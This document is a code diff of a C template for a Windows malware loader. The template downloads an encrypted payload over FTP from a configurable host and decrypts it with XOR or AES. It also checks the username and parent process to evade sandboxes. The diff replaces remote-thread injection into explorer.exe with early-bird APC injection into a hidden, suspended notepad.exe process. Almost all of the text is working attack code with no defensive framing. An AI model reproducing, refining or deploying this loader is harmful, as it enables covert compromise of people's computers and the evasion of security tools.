@@ -1,7 +1,7 @@
 #include <windows.h>
 #include <wininet.h>
-#include <tlhelp32.h>
 #include <psapi.h>
+#include <tlhelp32.h>
 #include <bcrypt.h>
 #include <stdio.h>
 #include <string.h>
@@ -10,11 +10,7 @@
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "psapi.lib")
 
-// Forward declarations
-int DL();
-void decrypt_payload(unsigned char *data, size_t data_len);
-int PI(unsigned char *sc, size_t sc_size);
-
+// Configuration
 unsigned char payload[] = { {{PAYLOAD_ARRAY}} };
 size_t payload_len = {{PAYLOAD_SIZE}};
 char key[] = {{KEY}};
@@ -27,14 +23,12 @@ wchar_t PROTOCOL[10];
 wchar_t IP[50];
 short PORT;
 wchar_t PATH[100];
-char PROCESS[50] = "explorer.exe";
 
 unsigned char *{{BUF_NAME}} = NULL;
 size_t {{SIZE_NAME}} = 0;
 int {{CAPACITY_NAME}} = 0;
 
-// {{JUNK}}
-
+// Helper functions
 int is_sandbox_user() {
     char username[256] = {0};
     DWORD size = sizeof(username);
@@ -60,18 +54,21 @@ int check_parent() {
     if (hParent) {
         HMODULE hMod;
         DWORD cbNeeded;
-        if (EnumProcessModules(hParent, &hMod, sizeof(hMod), &cbNeeded))
+        if (EnumProcessModules(hParent, &hMod, sizeof(hMod), &cbNeeded)) {
             GetModuleBaseNameA(hParent, hMod, parentName, sizeof(parentName));
+        }
         CloseHandle(hParent);
     }
     return _stricmp(parentName, "explorer.exe") != 0;
 }
 
+
 void decrypt_payload(unsigned char *data, size_t data_len) {
     if (strcmp(enc_algo, "xor") == 0) {
         for (size_t i = 0; i < data_len; i++)
             data[i] ^= key[i % strlen(key)];
-    } else if (strcmp(enc_algo, "aes") == 0) {
+    }
+    else if (strcmp(enc_algo, "aes") == 0) {
         BCRYPT_ALG_HANDLE hAlg = NULL;
         BCRYPT_KEY_HANDLE hKey = NULL;
         DWORD cbKeyObj = 0, cbData = 0;
@@ -83,8 +80,10 @@ void decrypt_payload(unsigned char *data, size_t data_len) {
         if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) return;
         if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) return;
         if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(DWORD), &cbData, 0)) return;
+        
         pbKeyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
         if (!pbKeyObj) return;
+        
         if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObj, cbKeyObj, keyMaterial, 16, 0)) return;
 
         ULONG outLen = 0;
@@ -96,15 +95,16 @@ void decrypt_payload(unsigned char *data, size_t data_len) {
     }
 }
 
-int DL() {
+int download_payload() {
     HMODULE hWinInet = LoadLibraryA("wininet.dll");
     if (!hWinInet) return 0;
 
-    typedef HINTERNET(WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
-    typedef HINTERNET(WINAPI *pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
-    typedef HINTERNET(WINAPI *pFtpOpenFileA)(HINTERNET, LPCSTR, DWORD, DWORD, DWORD_PTR);
-    typedef BOOL(WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
-    typedef BOOL(WINAPI *pInternetCloseHandle)(HINTERNET);
+    // Function pointers
+    typedef HINTERNET(WINAPI* pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
+    typedef HINTERNET(WINAPI* pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
+    typedef HINTERNET(WINAPI* pFtpOpenFileA)(HINTERNET, LPCSTR, DWORD, DWORD, DWORD_PTR);
+    typedef BOOL(WINAPI* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
+    typedef BOOL(WINAPI* pInternetCloseHandle)(HINTERNET);
 
     pInternetOpenA InternetOpenA_ = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
     pInternetConnectA InternetConnectA_ = (pInternetConnectA)GetProcAddress(hWinInet, "InternetConnectA");
@@ -125,63 +125,95 @@ int DL() {
     HINTERNET hFile = FtpOpenFileA_(hFtp, pathA, GENERIC_READ, FTP_TRANSFER_TYPE_BINARY, 0);
     if (!hFile) { InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet); return 0; }
 
-    unsigned char tempBuf[4096]; DWORD bytesRead = 0;
+    unsigned char tempBuf[4096]; 
+    DWORD bytesRead = 0;
     {{SIZE_NAME}} = {{CAPACITY_NAME}} = 0;
 
     while (InternetReadFile_(hFile, tempBuf, sizeof(tempBuf), &bytesRead) && bytesRead > 0) {
         if ({{SIZE_NAME}} + bytesRead > {{CAPACITY_NAME}}) {
             {{CAPACITY_NAME}} = ({{CAPACITY_NAME}} == 0) ? 8192 : {{CAPACITY_NAME}} * 2;
             {{BUF_NAME}} = (unsigned char*)realloc({{BUF_NAME}}, {{CAPACITY_NAME}});
-            if (!{{BUF_NAME}}) { InternetCloseHandle_(hFile); InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet); return 0; }
+            if (!{{BUF_NAME}}) { 
+                InternetCloseHandle_(hFile); 
+                InternetCloseHandle_(hFtp); 
+                InternetCloseHandle_(hInternet); 
+                return 0; 
+            }
         }
         memcpy({{BUF_NAME}} + {{SIZE_NAME}}, tempBuf, bytesRead);
         {{SIZE_NAME}} += bytesRead;
     }
 
-    InternetCloseHandle_(hFile); InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet);
+    InternetCloseHandle_(hFile); 
+    InternetCloseHandle_(hFtp); 
+    InternetCloseHandle_(hInternet);
     return 1;
 }
 
-int PI(unsigned char *sc, size_t sc_size) {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return -1;
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(pe);
-    DWORD pid = 0;
-    HANDLE hProcess = NULL;
-
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            if (_stricmp(PROCESS, pe.szExeFile) == 0) {
-                pid = pe.th32ProcessID;
-                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
-                if (hProcess) break;
-            }
-        } while (Process32Next(hSnapshot, &pe));
+void inject_into_process(unsigned char *sc, size_t sc_size) {
+    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
+    PROCESS_INFORMATION pi = { 0 };
+    
+    // Configure process to start hidden
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    
+    // Create suspended Notepad process
+    if (!CreateProcessA(
+        "C:\\Windows\\System32\\notepad.exe", 
+        NULL, 
+        NULL, 
+        NULL, 
+        FALSE, 
+        CREATE_SUSPENDED | CREATE_NO_WINDOW,  // Added CREATE_NO_WINDOW for extra protection
+        NULL, 
+        NULL, 
+        &si, 
+        &pi)) {
+        return;
     }
-    CloseHandle(hSnapshot);
-    if (!hProcess) return -1;
 
-    LPVOID alloc = VirtualAllocEx(hProcess, NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!alloc) { CloseHandle(hProcess); return -1; }
+    // Allocate memory in target process
+    LPVOID remote_mem = VirtualAllocEx(
+        pi.hProcess, 
+        NULL, 
+        sc_size, 
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_EXECUTE_READWRITE);
+    
+    if (!remote_mem) {
+        TerminateProcess(pi.hProcess, 1);
+        return;
+    }
 
-    if (!WriteProcessMemory(hProcess, alloc, sc, sc_size, NULL)) { CloseHandle(hProcess); return -1; }
+    // Write shellcode to target process
+    if (!WriteProcessMemory(pi.hProcess, remote_mem, sc, sc_size, NULL)) {
+        TerminateProcess(pi.hProcess, 1);
+        return;
+    }
 
+    // Change memory protection to RX
     DWORD oldProtect = 0;
-    if (!VirtualProtectEx(hProcess, alloc, sc_size, PAGE_EXECUTE_READWRITE, &oldProtect)) { CloseHandle(hProcess); return -1; }
+    VirtualProtectEx(pi.hProcess, remote_mem, sc_size, PAGE_EXECUTE_READ, &oldProtect);
 
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
-    if (!hThread) { CloseHandle(hProcess); return -1; }
+    // Queue the shellcode as an APC to be executed when the thread resumes
+    QueueUserAPC((PAPCFUNC)remote_mem, pi.hThread, (ULONG_PTR)remote_mem);
+    
+    // Resume the main thread
+    ResumeThread(pi.hThread);
 
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-    return 0;
+    // Clean up handles
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
 }
 
 int main() {
-    if (is_sandbox_user() || check_parent()) return -1;
+    // Anti-analysis checks
+    if (is_sandbox_user() || check_parent()) {
+        return -1;
+    }
 
+    // Initialize connection parameters
     wcscpy(PROTOCOL, L"{{PROTOCOL}}");
     wcscpy(IP, L"{{IP}}");
     PORT = {{PORT}};
@@ -190,19 +222,25 @@ int main() {
     unsigned char *final_payload = NULL;
     size_t final_size = 0;
 
+    // Download payload if IP is specified
     if (wcslen(IP) > 0) {
-        if (!DL()) return -1;
+        if (!download_payload()) {
+            return -1;
+        }
         final_payload = {{BUF_NAME}};
         final_size = {{SIZE_NAME}};
-    } else {
+    }
+    else {
         final_payload = payload;
         final_size = payload_len;
     }
 
+    // Decrypt the payload
     decrypt_payload(final_payload, final_size);
 
+    // Execute based on payload type
     if (!strcmp(payload_type, "shellcode")) {
-        PI(final_payload, final_size);
+        inject_into_process(final_payload, final_size);
     }
 
     return 0;
